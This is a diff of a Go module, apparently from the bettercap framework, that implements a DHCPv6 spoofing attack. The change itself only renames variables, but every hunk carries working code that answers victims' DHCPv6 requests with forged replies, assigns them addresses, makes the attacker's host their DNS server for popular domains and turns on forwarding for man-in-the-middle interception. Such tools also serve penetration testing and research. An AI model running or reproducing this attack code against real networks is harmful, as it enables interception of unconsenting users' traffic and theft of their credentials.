@@ -36,93 +36,93 @@ type DHCP6Spoofer struct {
 }
 
 func NewDHCP6Spoofer(s *session.Session) *DHCP6Spoofer {
-	spoof := &DHCP6Spoofer{
+	mod := &DHCP6Spoofer{
 		SessionModule: session.NewSessionModule("dhcp6.spoof", s),
 		Handle:        nil,
 		waitGroup:     &sync.WaitGroup{},
 	}
 
-	spoof.AddParam(session.NewStringParameter("dhcp6.spoof.domains",
+	mod.AddParam(session.NewStringParameter("dhcp6.spoof.domains",
 		"microsoft.com, google.com, facebook.com, apple.com, twitter.com",
 		``,
 		"Comma separated values of domain names to spoof."))
 
-	spoof.AddHandler(session.NewModuleHandler("dhcp6.spoof on", "",
+	mod.AddHandler(session.NewModuleHandler("dhcp6.spoof on", "",
 		"Start the DHCPv6 spoofer in the background.",
 		func(args []string) error {
-			return spoof.Start()
+			return mod.Start()
 		}))
 
-	spoof.AddHandler(session.NewModuleHandler("dhcp6.spoof off", "",
+	mod.AddHandler(session.NewModuleHandler("dhcp6.spoof off", "",
 		"Stop the DHCPv6 spoofer in the background.",
 		func(args []string) error {
-			return spoof.Stop()
+			return mod.Stop()
 		}))
 
-	return spoof
+	return mod
 }
 
-func (s DHCP6Spoofer) Name() string {
+func (mod DHCP6Spoofer) Name() string {
 	return "dhcp6.spoof"
 }
 
-func (s DHCP6Spoofer) Description() string {
+func (mod DHCP6Spoofer) Description() string {
 	return "Replies to DHCPv6 messages, providing victims with a link-local IPv6 address and setting the attackers host as default DNS server (https://github.com/fox-it/mitm6/)."
 }
 
-func (s DHCP6Spoofer) Author() string {
+func (mod DHCP6Spoofer) Author() string {
 	return "Simone Margaritelli <evilsocket@gmail.com>"
 }
 
-func (s *DHCP6Spoofer) Configure() error {
+func (mod *DHCP6Spoofer) Configure() error {
 	var err error
 
-	if s.Running() {
+	if mod.Running() {
 		return session.ErrAlreadyStarted
 	}
 
-	if s.Handle, err = pcap.OpenLive(s.Session.Interface.Name(), 65536, true, pcap.BlockForever); err != nil {
+	if mod.Handle, err = pcap.OpenLive(mod.Session.Interface.Name(), 65536, true, pcap.BlockForever); err != nil {
 		return err
 	}
 
-	err = s.Handle.SetBPFFilter("ip6 and udp")
+	err = mod.Handle.SetBPFFilter("ip6 and udp")
 	if err != nil {
 		return err
 	}
 
-	if err, s.Domains = s.ListParam("dhcp6.spoof.domains"); err != nil {
+	if err, mod.Domains = mod.ListParam("dhcp6.spoof.domains"); err != nil {
 		return err
 	}
 
-	s.RawDomains = packets.DHCP6EncodeList(s.Domains)
+	mod.RawDomains = packets.DHCP6EncodeList(mod.Domains)
 
-	if s.DUID, err = dhcp6opts.NewDUIDLLT(1, time.Date(2000, time.January, 1, 0, 0, 0, 0, time.UTC), s.Session.Interface.HW); err != nil {
+	if mod.DUID, err = dhcp6opts.NewDUIDLLT(1, time.Date(2000, time.January, 1, 0, 0, 0, 0, time.UTC), mod.Session.Interface.HW); err != nil {
 		return err
-	} else if s.DUIDRaw, err = s.DUID.MarshalBinary(); err != nil {
+	} else if mod.DUIDRaw, err = mod.DUID.MarshalBinary(); err != nil {
 		return err
 	}
 
-	if !s.Session.Firewall.IsForwardingEnabled() {
-		s.Info("Enabling forwarding.")
-		s.Session.Firewall.EnableForwarding(true)
+	if !mod.Session.Firewall.IsForwardingEnabled() {
+		mod.Info("Enabling forwarding.")
+		mod.Session.Firewall.EnableForwarding(true)
 	}
 
 	return nil
 }
 
-func (s *DHCP6Spoofer) dhcp6For(what dhcp6.MessageType, to dhcp6.Packet) (err error, p dhcp6.Packet) {
-	err, p = packets.DHCP6For(what, to, s.DUIDRaw)
+func (mod *DHCP6Spoofer) dhcp6For(what dhcp6.MessageType, to dhcp6.Packet) (err error, p dhcp6.Packet) {
+	err, p = packets.DHCP6For(what, to, mod.DUIDRaw)
 	if err != nil {
 		return
 	}
 
-	p.Options.AddRaw(packets.DHCP6OptDNSServers, s.Session.Interface.IPv6)
-	p.Options.AddRaw(packets.DHCP6OptDNSDomains, s.RawDomains)
+	p.Options.AddRaw(packets.DHCP6OptDNSServers, mod.Session.Interface.IPv6)
+	p.Options.AddRaw(packets.DHCP6OptDNSDomains, mod.RawDomains)
 
 	return nil, p
 }
 
-func (s *DHCP6Spoofer) dhcpAdvertise(pkt gopacket.Packet, solicit dhcp6.Packet, target net.HardwareAddr) {
+func (mod *DHCP6Spoofer) dhcpAdvertise(pkt gopacket.Packet, solicit dhcp6.Packet, target net.HardwareAddr) {
 	pip6 := pkt.Layer(layers.LayerTypeIPv6).(*layers.IPv6)
 
 	fqdn := target.String()
@@ -130,29 +130,29 @@ func (s *DHCP6Spoofer) dhcpAdvertise(pkt gopacket.Packet, solicit dhcp6.Packet, 
 		fqdn = string(raw[0])
 	}
 
-	s.Info("Got DHCPv6 Solicit request from %s (%s), sending spoofed advertisement for %d domains.", tui.Bold(fqdn), target, len(s.Domains))
+	mod.Info("Got DHCPv6 Solicit request from %s (%s), sending spoofed advertisement for %d domains.", tui.Bold(fqdn), target, len(mod.Domains))
 
-	err, adv := s.dhcp6For(dhcp6.MessageTypeAdvertise, solicit)
+	err, adv := mod.dhcp6For(dhcp6.MessageTypeAdvertise, solicit)
 	if err != nil {
-		s.Error("%s", err)
+		mod.Error("%s", err)
 		return
 	}
 
 	var solIANA dhcp6opts.IANA
 
 	if raw, found := solicit.Options[dhcp6.OptionIANA]; !found || len(raw) < 1 {
-		s.Error("Unexpected DHCPv6 packet, could not find IANA.")
+		mod.Error("Unexpected DHCPv6 packet, could not find IANA.")
 		return
 	} else if err := solIANA.UnmarshalBinary(raw[0]); err != nil {
-		s.Error("Unexpected DHCPv6 packet, could not deserialize IANA.")
+		mod.Error("Unexpected DHCPv6 packet, could not deserialize IANA.")
 		return
 	}
 
 	var ip net.IP
-	if h, found := s.Session.Lan.Get(target.String()); found {
+	if h, found := mod.Session.Lan.Get(target.String()); found {
 		ip = h.IP
 	} else {
-		s.Warning("Address %s not known, using random identity association address.", target.String())
+		mod.Warning("Address %s not known, using random identity association address.", target.String())
 		rand.Read(ip)
 	}
 
@@ -160,13 +160,13 @@ func (s *DHCP6Spoofer) dhcpAdvertise(pkt gopacket.Packet, solicit dhcp6.Packet, 
 
 	iaaddr, err := dhcp6opts.NewIAAddr(net.ParseIP(addr), 300*time.Second, 300*time.Second, nil)
 	if err != nil {
-		s.Error("Error creating IAAddr: %s", err)
+		mod.Error("Error creating IAAddr: %s", err)
 		return
 	}
 
 	iaaddrRaw, err := iaaddr.MarshalBinary()
 	if err != nil {
-		s.Error("Error serializing IAAddr: %s", err)
+		mod.Error("Error serializing IAAddr: %s", err)
 		return
 	}
 
@@ -174,7 +174,7 @@ func (s *DHCP6Spoofer) dhcpAdvertise(pkt gopacket.Packet, solicit dhcp6.Packet, 
 	iana := dhcp6opts.NewIANA(solIANA.IAID, 200*time.Second, 250*time.Second, opts)
 	ianaRaw, err := iana.MarshalBinary()
 	if err != nil {
-		s.Error("Error serializing IANA: %s", err)
+		mod.Error("Error serializing IANA: %s", err)
 		return
 	}
 
@@ -182,12 +182,12 @@ func (s *DHCP6Spoofer) dhcpAdvertise(pkt gopacket.Packet, solicit dhcp6.Packet, 
 
 	rawAdv, err := adv.MarshalBinary()
 	if err != nil {
-		s.Error("Error serializing advertisement packet: %s.", err)
+		mod.Error("Error serializing advertisement packet: %s.", err)
 		return
 	}
 
 	eth := layers.Ethernet{
-		SrcMAC:       s.Session.Interface.HW,
+		SrcMAC:       mod.Session.Interface.HW,
 		DstMAC:       target,
 		EthernetType: layers.EthernetTypeIPv6,
 	}
@@ -196,7 +196,7 @@ func (s *DHCP6Spoofer) dhcpAdvertise(pkt gopacket.Packet, solicit dhcp6.Packet, 
 		Version:    6,
 		NextHeader: layers.IPProtocolUDP,
 		HopLimit:   64,
-		SrcIP:      s.Session.Interface.IPv6,
+		SrcIP:      mod.Session.Interface.IPv6,
 		DstIP:      pip6.SrcIP,
 	}
 
@@ -213,31 +213,31 @@ func (s *DHCP6Spoofer) dhcpAdvertise(pkt gopacket.Packet, solicit dhcp6.Packet, 
 
 	err, raw := packets.Serialize(&eth, &ip6, &udp, &dhcp)
 	if err != nil {
-		s.Error("Error serializing packet: %s.", err)
+		mod.Error("Error serializing packet: %s.", err)
 		return
 	}
 
-	s.Debug("Sending %d bytes of packet ...", len(raw))
-	if err := s.Session.Queue.Send(raw); err != nil {
-		s.Error("Error sending packet: %s", err)
+	mod.Debug("Sending %d bytes of packet ...", len(raw))
+	if err := mod.Session.Queue.Send(raw); err != nil {
+		mod.Error("Error sending packet: %s", err)
 	}
 }
 
-func (s *DHCP6Spoofer) dhcpReply(toType string, pkt gopacket.Packet, req dhcp6.Packet, target net.HardwareAddr) {
-	s.Debug("Sending spoofed DHCPv6 reply to %s after its %s packet.", tui.Bold(target.String()), toType)
+func (mod *DHCP6Spoofer) dhcpReply(toType string, pkt gopacket.Packet, req dhcp6.Packet, target net.HardwareAddr) {
+	mod.Debug("Sending spoofed DHCPv6 reply to %s after its %s packet.", tui.Bold(target.String()), toType)
 
-	err, reply := s.dhcp6For(dhcp6.MessageTypeReply, req)
+	err, reply := mod.dhcp6For(dhcp6.MessageTypeReply, req)
 	if err != nil {
-		s.Error("%s", err)
+		mod.Error("%s", err)
 		return
 	}
 
 	var reqIANA dhcp6opts.IANA
 	if raw, found := req.Options[dhcp6.OptionIANA]; !found || len(raw) < 1 {
-		s.Error("Unexpected DHCPv6 packet, could not find IANA.")
+		mod.Error("Unexpected DHCPv6 packet, could not find IANA.")
 		return
 	} else if err := reqIANA.UnmarshalBinary(raw[0]); err != nil {
-		s.Error("Unexpected DHCPv6 packet, could not deserialize IANA.")
+		mod.Error("Unexpected DHCPv6 packet, could not deserialize IANA.")
 		return
 	}
 
@@ -245,7 +245,7 @@ func (s *DHCP6Spoofer) dhcpReply(toType string, pkt gopacket.Packet, req dhcp6.P
 	if raw, found := reqIANA.Options[dhcp6.OptionIAAddr]; found {
 		reqIAddr = raw[0]
 	} else {
-		s.Error("Unexpected DHCPv6 packet, could not deserialize request IANA IAAddr.")
+		mod.Error("Unexpected DHCPv6 packet, could not deserialize request IANA IAAddr.")
 		return
 	}
 
@@ -253,20 +253,20 @@ func (s *DHCP6Spoofer) dhcpReply(toType string, pkt gopacket.Packet, req dhcp6.P
 	iana := dhcp6opts.NewIANA(reqIANA.IAID, 200*time.Second, 250*time.Second, opts)
 	ianaRaw, err := iana.MarshalBinary()
 	if err != nil {
-		s.Error("Error serializing IANA: %s", err)
+		mod.Error("Error serializing IANA: %s", err)
 		return
 	}
 	reply.Options.AddRaw(dhcp6.OptionIANA, ianaRaw)
 
 	rawAdv, err := reply.MarshalBinary()
 	if err != nil {
-		s.Error("Error serializing advertisement packet: %s.", err)
+		mod.Error("Error serializing advertisement packet: %s.", err)
 		return
 	}
 
 	pip6 := pkt.Layer(layers.LayerTypeIPv6).(*layers.IPv6)
 	eth := layers.Ethernet{
-		SrcMAC:       s.Session.Interface.HW,
+		SrcMAC:       mod.Session.Interface.HW,
 		DstMAC:       target,
 		EthernetType: layers.EthernetTypeIPv6,
 	}
@@ -275,7 +275,7 @@ func (s *DHCP6Spoofer) dhcpReply(toType string, pkt gopacket.Packet, req dhcp6.P
 		Version:    6,
 		NextHeader: layers.IPProtocolUDP,
 		HopLimit:   64,
-		SrcIP:      s.Session.Interface.IPv6,
+		SrcIP:      mod.Session.Interface.IPv6,
 		DstIP:      pip6.SrcIP,
 	}
 
@@ -292,13 +292,13 @@ func (s *DHCP6Spoofer) dhcpReply(toType string, pkt gopacket.Packet, req dhcp6.P
 
 	err, raw := packets.Serialize(&eth, &ip6, &udp, &dhcp)
 	if err != nil {
-		s.Error("Error serializing packet: %s.", err)
+		mod.Error("Error serializing packet: %s.", err)
 		return
 	}
 
-	s.Debug("Sending %d bytes of packet ...", len(raw))
-	if err := s.Session.Queue.Send(raw); err != nil {
-		s.Error("Error sending packet: %s", err)
+	mod.Debug("Sending %d bytes of packet ...", len(raw))
+	if err := mod.Session.Queue.Send(raw); err != nil {
+		mod.Error("Error sending packet: %s", err)
 	}
 
 	if toType == "request" {
@@ -307,26 +307,26 @@ func (s *DHCP6Spoofer) dhcpReply(toType string, pkt gopacket.Packet, req dhcp6.P
 			addr = net.IP(raw[0])
 		}
 
-		if h, found := s.Session.Lan.Get(target.String()); found {
-			s.Info("IPv6 address %s is now assigned to %s", addr.String(), h)
+		if h, found := mod.Session.Lan.Get(target.String()); found {
+			mod.Info("IPv6 address %s is now assigned to %s", addr.String(), h)
 		} else {
-			s.Info("IPv6 address %s is now assigned to %s", addr.String(), target)
+			mod.Info("IPv6 address %s is now assigned to %s", addr.String(), target)
 		}
 	} else {
-		s.Debug("DHCPv6 renew sent to %s", target)
+		mod.Debug("DHCPv6 renew sent to %s", target)
 	}
 }
 
-func (s *DHCP6Spoofer) duidMatches(dhcp dhcp6.Packet) bool {
+func (mod *DHCP6Spoofer) duidMatches(dhcp dhcp6.Packet) bool {
 	if raw, found := dhcp.Options[dhcp6.OptionServerID]; found && len(raw) >= 1 {
-		if bytes.Equal(raw[0], s.DUIDRaw) {
+		if bytes.Equal(raw[0], mod.DUIDRaw) {
 			return true
 		}
 	}
 	return false
 }
 
-func (s *DHCP6Spoofer) onPacket(pkt gopacket.Packet) {
+func (mod *DHCP6Spoofer) onPacket(pkt gopacket.Packet) {
 	var dhcp dhcp6.Packet
 	var err error
 
@@ -341,46 +341,46 @@ func (s *DHCP6Spoofer) onPacket(pkt gopacket.Packet) {
 		switch dhcp.MessageType {
 		case dhcp6.MessageTypeSolicit:
 
-			s.dhcpAdvertise(pkt, dhcp, eth.SrcMAC)
+			mod.dhcpAdvertise(pkt, dhcp, eth.SrcMAC)
 
 		case dhcp6.MessageTypeRequest:
-			if s.duidMatches(dhcp) {
-				s.dhcpReply("request", pkt, dhcp, eth.SrcMAC)
+			if mod.duidMatches(dhcp) {
+				mod.dhcpReply("request", pkt, dhcp, eth.SrcMAC)
 			}
 
 		case dhcp6.MessageTypeRenew:
-			if s.duidMatches(dhcp) {
-				s.dhcpReply("renew", pkt, dhcp, eth.SrcMAC)
+			if mod.duidMatches(dhcp) {
+				mod.dhcpReply("renew", pkt, dhcp, eth.SrcMAC)
 			}
 		}
 	}
 }
 
-func (s *DHCP6Spoofer) Start() error {
-	if err := s.Configure(); err != nil {
+func (mod *DHCP6Spoofer) Start() error {
+	if err := mod.Configure(); err != nil {
 		return err
 	}
 
-	return s.SetRunning(true, func() {
-		s.waitGroup.Add(1)
-		defer s.waitGroup.Done()
+	return mod.SetRunning(true, func() {
+		mod.waitGroup.Add(1)
+		defer mod.waitGroup.Done()
 
-		src := gopacket.NewPacketSource(s.Handle, s.Handle.LinkType())
-		s.pktSourceChan = src.Packets()
-		for packet := range s.pktSourceChan {
-			if !s.Running() {
+		src := gopacket.NewPacketSource(mod.Handle, mod.Handle.LinkType())
+		mod.pktSourceChan = src.Packets()
+		for packet := range mod.pktSourceChan {
+			if !mod.Running() {
 				break
 			}
 
-			s.onPacket(packet)
+			mod.onPacket(packet)
 		}
 	})
 }
 
-func (s *DHCP6Spoofer) Stop() error {
-	return s.SetRunning(false, func() {
-		s.pktSourceChan <- nil
-		s.Handle.Close()
-		s.waitGroup.Wait()
+func (mod *DHCP6Spoofer) Stop() error {
+	return mod.SetRunning(false, func() {
+		mod.pktSourceChan <- nil
+		mod.Handle.Close()
+		mod.waitGroup.Wait()
 	})
 }
